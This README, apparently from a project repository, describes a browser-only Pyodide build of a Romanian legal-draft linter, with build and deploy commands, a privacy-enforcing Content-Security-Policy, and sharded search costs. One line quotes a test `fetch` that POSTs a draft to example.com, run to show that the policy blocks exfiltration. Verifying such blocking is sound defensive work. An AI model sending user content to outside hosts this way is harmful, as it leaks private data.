# web — the app in the browser, no server

The same app the localhost server drives, running entirely in the browser under
[Pyodide](https://pyodide.org): the engines execute client-side, and **nothing the user types
leaves the tab**. The page's `fetch('/api/…')` is redirected in-process to `scripts.servicii` — the
exact functions `scripts/server.py` serves over HTTP — so it is one implementation with two skins,
and the test suite guards both.

## The privacy guarantee is enforced, not just claimed

The page ships a `Content-Security-Policy` whose load-bearing line is
`connect-src 'self' https://cdn.jsdelivr.net`. Even a compromised or injected script cannot send
the draft anywhere but this origin and the Pyodide CDN. Verified in a browser: after linting a
draft, `performance.getEntriesByType('resource')` shows **zero** `/api/` requests, and a deliberate
`fetch('https://example.com', {method:'POST', body:'DRAFT'})` is **blocked** by the policy. The
only network calls are Pyodide (runtime + the `sqlite3` package) and the static public-law data.

## Build and run

```
uv run python -m scripts.construieste_web --sursa fixturi   # reproducible demo, from sources/*.gz
uv run python -m http.server -d web 8088                     # open http://127.0.0.1:8088
```

`--sursa fixturi` builds a small, real corpus by parsing the committed `sources/` pages (Legea
98/2016 and the acts around it) to their article tree — ~4 acts, ~2,460 provisions, a graph of the
edges between them — needing nothing git-ignored, so **CI builds the same bytes**. `--sursa corpus`
(the default when `corpus.db` exists) instead ships a slice of the full collected corpus, for a
local preview against more breadth.

Everything under `web/` except this file is generated and git-ignored — the build script is the
source. `index.html` is `app/index.html` with the CSP `<meta>` and one boot block injected (loads
Pyodide + `sqlite3`, unpacks the engines and fixtures into the virtual filesystem, mounts the data,
wires the `fetch` shim).

## Deploy

`.github/workflows/pages.yml` builds `--sursa fixturi` and publishes `web/` to GitHub Pages on push
to `main`. To turn it on: **Settings → Pages → Source: GitHub Actions** (and make the repo public,
or use Pages on a plan that allows private). No secrets are needed.

## Search covers the corpus without shipping it

Search is the first check moved off the shipped slice and onto **fetch-on-demand shards**
(`scripts/shard.py` builds them, `scripts/cauta_web.py` reads them, in Pyodide). A query fetches
only the inverted-index shards its own tokens fall in, ranks the acts those postings name, and
fetches the provisions of just the top few to cut snippets. Verified in a browser: searching
`autoritate contractantă` fetched `idx/au.json` + `idx/co.json` and three act files — nothing else.

The economics, measured on the 11 272-act corpus collected so far:

| Piece | Size | When it loads |
| --- | --- | --- |
| `index.json` (act catalogue) | 0.70 MB gzipped | once |
| inverted index (795 prefix shards) | 6.82 MB gzipped total | **only the ~1 shard per query token** (~8 KB each) |
| `acte/<id>.json` (provisions) | 111 MB total | **one file per result, on demand** |

So a 259 MB SQLite corpus becomes ~0.7 MB up front and a few kilobytes per search. It scales the
same way to the full body of law; the next optimisation is to shard the act index itself (0.7 MB
for 11k grows with the corpus) and to serve a data release rather than rebuild in CI.

## The remaining limit, and where it goes

The lint passes that read the corpus ("ce atinge", repealed, terminology) still use the shipped
slice — silent, never wrong, where the data does not reach; moving them onto the same shard layer
(and the graph onto per-act shards) is the follow-on. A hardened build would also self-host the
Pyodide runtime and externalise the inline scripts to drop `'unsafe-inline'`; neither changes the
exfiltration guarantee, which rests on `connect-src`.
